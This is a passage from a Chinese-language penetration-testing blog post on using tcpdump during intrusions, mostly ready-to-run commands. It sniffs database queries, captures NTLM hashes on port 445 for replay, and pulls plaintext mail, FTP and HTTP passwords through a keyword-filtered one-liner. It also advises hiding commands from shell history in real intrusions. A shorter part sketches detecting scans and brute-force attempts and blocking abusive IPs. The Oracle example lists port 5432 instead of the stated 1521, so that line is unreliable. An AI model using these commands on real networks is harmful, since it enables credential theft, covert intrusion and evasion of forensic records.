<p><img src="/img/tcpdump mssql.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 pgsql 的增删改查sql默认端口<span class="number">5432</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  dst port 5432 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
<p><img src="/img/tcpdump postgresql.jpg" alt="&quot;bypasscdn&quot;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 oracle 的增删改查sql(默认端口<span class="number">1521</span>),后面就不一一截图了,累:</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  dst port 5432 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">截获win内网的 ntlm hash(主要是为了重放):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  'dst port 445 and dst host 192.168.3.23'</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">smtp(默认端口<span class="symbol">:</span><span class="number">25</span>) /imap(默认端口<span class="symbol">:</span><span class="number">143</span>) /pop3(默认端口<span class="symbol">:</span><span class="number">110</span>) 抓取各类邮箱明文登录密码(如果是带s的,这样是抓不到的哦):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  '(dst port 25 or dst port 143 or dst port 110) and dst host 192.168.3.30'</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ldap(默认端口<span class="symbol">:</span><span class="number">389</span>):</div><div class="line"><span class="comment"># tcpdump -nn -vv -A -i eth0 -s 0 -w /shared/tmp/ldap.cap dst host 192.168.3.23 and dst port 389</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">svn(默认端口<span class="symbol">:</span><span class="number">3690</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -A  dst port 3690 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">尝试一句话tcpdump 截获内网中的各类明文密码数据(实际渗透中,账号密码字段,可以根据目标实际环境[观察目标网站后台的账号密码字段命名习惯]自己多写一些,以增加命中率):</div><div class="line"><span class="comment"># tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass|user' --color=auto --line-buffered -B20 -w res_bak.txt</span></div></pre></td></tr></table></figure>
<p><br></p>
<p>同样,我们也可以尝试利用tcpdump来简单捕获内网的一些入侵及攻击行为,实际测试过程中还有一些问题需要解决,后期搞通透了会继续更新上来,实在抱歉[最好直接在网关上搞]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">发现内网中的中间人行为:</div><div class="line">arp  dhcp icmp ……</div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">发现内网中的端口扫描行为</div><div class="line">top <span class="number">46</span> 高危端口扫描</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">发现内网中的服务爆破行为:</div><div class="line">mssql(sa) smb() ftp() rdp() ssh() ldap() snmp() http()……</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检测内网中的有无指定的一些tcp马的数据特征,比如一些常用工具生成的payload特征[原谅我,到现在也没太搞明白meterpreter的内部数据结构,表哥们谁对这一块比较熟,诚心求教]</div><div class="line">msf</div></pre></td></tr></table></figure>
<p>尝试利用tcpdump对网站进行一些临时性的流量监控:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">粗略抓取请求最频繁的ip[对于一般的CC还是可以的,如果是挂代理的就不能这样搞了]</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -tnn dst port 80 -c 100 | awk -F"." '&#123;print $1"."$2"."$3"."$4&#125;' | sort | uniq -c | sort -nr |head -20</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">记录请求最多的<span class="symbol">ip:</span></div><div class="line"><span class="comment"># netstat -anlp | grep 80 | grep tcp|awk '&#123;print $5&#125;'|awk -F: '&#123;print $1&#125;'|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk '/:80/&#123;split($5,ip,":");++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;' |sort -rn|head -n20</span></div><div class="line"><span class="comment"># iptables -I INPUT -s 扫描者的ip段 -j DROP</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">更多,待续……</div></pre></td></tr></table></figure>
<p><br></p>
<h5 id="一些小结"><a href="#一些小结" class="headerlink" title="一些小结:"></a>一些小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;虽然是个小工具,但不乏大作为,尤其在目标系统是linux的情况下,利用系统已有的工具进行渗透,无疑是极好的,注意,实际渗透中,最好把它放在后台,如果你不想让命令记录被到history中,可以先 echo $HISTCONTROL看看,把它设置成空格开头的命令不记录就行了[可能需要你先拿到root],另外,如果你想深入的去学习某些协议的内部运作流程,tcpdump无疑也是一款非常好的入门工具,其实,就工具本身使用来讲,大家也都看到了,几乎是没有任何技术含量,真正考验你的还是对各种常用协议的熟知程度,从各种协议数据里面找到你想要的东西才是关键,最后,还是那句老话,工具是死的,人是活的,脑洞要大,才有可能把’不可能’变成’可能’……我知道,其实大家还有非常多的更精悍的用法,都没有放出来,总得有人先当这个杂碎,所以这里我就先献个丑,期待大家的精华</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/3/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klionsec">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:klionsec@gmail.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    <h2>blog by klion</h2>
                </div>
            </div>
        </div>
    </div>
</footer>


<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>